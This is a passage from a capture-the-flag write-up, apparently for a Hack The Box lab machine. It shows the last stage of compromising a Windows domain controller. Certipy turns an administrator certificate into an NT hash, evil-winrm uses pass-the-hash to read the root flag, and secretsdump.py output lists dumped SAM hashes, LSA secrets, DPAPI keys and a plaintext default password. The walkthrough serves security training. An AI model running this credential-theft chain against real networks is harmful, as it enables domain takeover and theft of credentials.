[*] Successfully updated 'ca_svc'
```

``Since we got certificate as administrator, let authenticate to the domain``
```
❯ certipy auth -dc-ip 10.129.232.88 -pfx administrator.pfx -u administrator -domain fluffy.htb
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
``We got hash of Administrator. ``


```bash
# Privilege escalation command


❯ evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e


Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/28/2025   7:12 AM             34 root.txt


cat *Evil-WinRM* PS C:\Users\Administrator\Desktop>  cat root.txt
d3abf02327f<REDACTED> 
*Evil-WinRM* PS C:\Users\Administrator\Desktop>

```

```bash 
❯ secretsdump.py -hashes :8da83a3fa618b6e3a00e93f676c92a6e FLUFFY/Administrator@10.129.232.88
/root/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xffa5608d6bd2811aaabfd47fbc3d1c37
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
FLUFFY\DC01$:aes256-cts-hmac-sha1-96:34b5e3f67441a6c19509cb966b9e5392e48257ff5058e7a22a4282fe822a5751
FLUFFY\DC01$:aes128-cts-hmac-sha1-96:19a1dd430a92c3568f04814342d8e486
FLUFFY\DC01$:des-cbc-md5:ec13a85edf688a85
FLUFFY\DC01$:plain_password_hex:c051a2b56dd8422b09fcc441e1bfaf0a5f0fe659a1634184e7dd6849da03747cad2050bd71e55da3e979245cb872106b52367ac876380294db669d308655c9f8f72b71ea10b4cc90199e1a059645dad4e77b3b982de60b7a59af8d4261b0077be1890caf3aa7e6290dcbc0c443f81bc6124cdef4e26472b3a5c8bcd8fc666b876709496e61a026559328d19db45819e69695bbafda526692513d2457e98de68b9473b08ed96e1d50b06dc53c6e58a595feebd6568a2a75811a5456336f40ede98c2996a0360a618d492e112a905235641126ad3234d68a920c0cd9439b4bd7203d28a1ad4d2ebdbe484d47836735b4cb
FLUFFY\DC01$:aad3b435b51404eeaad3b435b51404ee:7a9950c26fe9c3cbfe5b9ceaa21c9bfd:::
[*] DefaultPassword
p.agila:prometheusx-303
[*] DPAPI_SYSTEM
dpapi_machinekey:0x50f64bc1be95364da6cc33deca194d9b827c4846
dpapi_userkey:0xe410025a604608d81064e274f6eb46cba458ebd5
[*] NL$KM
 0000   0B 4A EC B4 04 86 59 99  A3 11 64 45 1D F8 EF E0   .J....Y...dE....
 0010   74 E0 BB 5A 07 EA AD B9  63 4D AB 03 B5 0F 69 3D   t..Z....cM....i=
 0020   C5 C2 F8 4E F0 EC EC B6  28 A2 59 AB BA 2B F0 A2   ...N....(.Y..+..
 0030   57 89 D1 62 FA 69 04 2A  31 57 54 5A FB B0 2A 18   W..b.i.*1WTZ..*.
NL$KM:0b4aecb404865999a31164451df8efe074e0bb5a07eaadb9634dab03b50f693dc5c2f84ef0ececb628a259abba2bf0a25789d162fa69042a3157545afbb02a18
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

```

[Link to Phase 2]

